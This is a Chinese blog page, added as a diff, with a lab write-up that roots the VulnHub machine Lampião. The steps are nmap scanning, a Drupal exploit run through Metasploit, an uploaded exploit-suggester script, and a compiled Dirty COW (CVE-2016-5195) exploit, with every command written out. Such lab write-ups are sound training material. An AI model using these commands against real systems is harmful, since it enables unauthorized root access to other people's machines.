@@ -1,0 +1,308 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title> | 剣の魔王の小窝</title>
+    <meta name="author" content="剣の魔王" />
+    <meta name="description" content="这个网站没有描述" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/head.png" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.css" />
+<script src="/js/lib/math.js"></script>
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<script src="https://cdn.staticfile.org/animejs/3.2.1/anime.min.js"></script>
+<link rel="stylesheet" href="/css/main.css" />
+<link rel="preconnect" href="https://static-argvchs.netlify.app" />
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+
+			<canvas
+			id="fireworks"
+			style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: 32767">
+			</canvas>
+			<script src="https://s4.zstatic.net/ajax/libs/animejs/3.2.1/anime.min.js"></script>
+			<script src="/js/lib/fireworks.min.js"></script>
+			
+			<canvas
+			id="background"
+			style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: -1"></canvas>
+			<script src="/js/lib/background.min.js"></script>
+
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>剣の魔王の小窝</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;剣の魔王の小窝</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1></h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/5/5
+        </span>
+        
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="脏牛内核漏洞-Linux内网提权"><a href="#脏牛内核漏洞-Linux内网提权" class="headerlink" title="脏牛内核漏洞-Linux内网提权"></a>脏牛内核漏洞-Linux内网提权</h1><p>靶机下载链接：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/xxe-lab-1,254/"><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/lampiao-1,249/">Lampião: 1 ~ VulnHub</a></a></p>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/MCTSOG/article/details/124640418">第63天-权限提升-Linux 脏牛内核漏洞&amp;SUID&amp;信息收_linux提权手法总结.pdf-CSDN博客</a></p>
+<p>Linux信息探针地址：<a target="_blank" rel="noopener" href="https://github.com/The-Z-Labs/linux-exploit-suggester">The-Z-Labs/linux-exploit-suggester: Linux privilege escalation auditing tool (github.com)</a></p>
+<p>脏牛exp：<a target="_blank" rel="noopener" href="https://github.com/gbonacini/CVE-2016-5195">https://github.com/gbonacini/CVE-2016-5195</a></p>
+<p><strong><span id="more"></span></strong></p>
+<p>先获取本机的ip地址，之后nmap扫描该网段</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240108-141604.png" alt="image-20240108141603166"></p>
+<p>发现靶机是192.168.145.144地址，然后使用nmap深入扫描</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240108-141701.png" alt="image-20240108141659904"></p>
+<p>80端口开启，访问</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240108-141841.png" alt="image-20240108141839545"></p>
+<p>没有什么有用信息，继续扫描开放端口</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240108-142023.png" alt="image-20240108142022617"></p>
+<p>1898端口也开放，继续访问</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240108-142123.png" alt="image-20240108142122041"></p>
+<p>看一圈下来发现使用的是drupal的CMS框架，网上搜索发现爆过漏洞，或者使用msfconsole搜索</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240108-142440.png" alt="image-20240108142439025"></p>
+<p><code>msfconsole</code></p>
+<p><code>search drupal</code></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240108-143402.png" alt="image-20240108143400970"></p>
+<p><code>use 1</code></p>
+<p><code>show options        //显示设置</code> </p>
+<p><code>set rhosts 192.168.145.144            //靶机地址</code></p>
+<p><code>set rport 1898                //目标端口</code></p>
+<p><code>exploit                //开启远程会话</code></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240108-143558.png" alt="image-20240108143557278"></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240108-143824.png" alt="image-20240108143823008"></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240108-144111.png" alt="image-20240108144109772"></p>
+<p>将下载好的探针脚本放到kali后上传到目标主机</p>
+<p><code>upload /tmp/linux-exploit-suggester.sh /tmp/1.sh</code></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240108-144524.png" alt="image-20240108144522778"></p>
+<p><code>shell</code></p>
+<p><code>cd /tmp</code></p>
+<p><code>chmod +x 1.sh        //赋权</code></p>
+<p><code>./1.sh</code></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240108-145251.png" alt="image-20240108145250590"></p>
+<p>按理来说扫描出来的都得尝试一遍，把exp脚本下载下来放到靶机</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240108-145423.png" alt="image-20240108145422102"></p>
+<p><code>upload /root/dcow.cpp /tmp</code></p>
+<p><code>cd /tmp</code></p>
+<p><code>g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil            //gcc编译</code></p>
+<p><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;) //使用python开启一个模拟终端利用漏洞，交互式shell</code></p>
+<p><code>./dcow</code></p>
+<p>得到root的密码为dirtyCowFun，使用密码登录root成功，得到root目录下的flag</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240108-151045.png" alt="image-20240108151044620"></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240108-151759.png" alt="image-20240108151758263"></p>
+
+    </div>
+    
+    
+    
+    
+    <div id="comment">
+        <div id="giscus-container" class="giscus"></div>
+    </div>
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 剣の魔王の小窝
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;剣の魔王
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    <script>
+        console.info("Welcome to Argvchs' blog!");
+        if (!window.hasOwnProperty("ontouchstart")) {
+            let html = '<canvas id="fireworks" style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: 32767"></canvas><script src="https://static-argvchs.netlify.app/js/fireworks.min.js"><\/script>';
+            document.body.append(document.createRange().createContextualFragment(html));
+        }
+    </script>
+    
+    
+<script
+    src="https://giscus.app/client.js"
+    data-repo="argvchs/giscus-comments"
+    data-repo-id="R_kgDOI_uC-w"
+    data-category="Announcements"
+    data-category-id="DIC_kwDOI_uC-84CUToF"
+    data-mapping="pathname"
+    data-strict="1"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="bottom"
+    data-theme="https://static-argvchs.netlify.app/css/giscus.css"
+    data-lang="zh-CN"
+    crossorigin
+    async
+></script>
+
+
+
+
+
+    
+</body>
+</html>
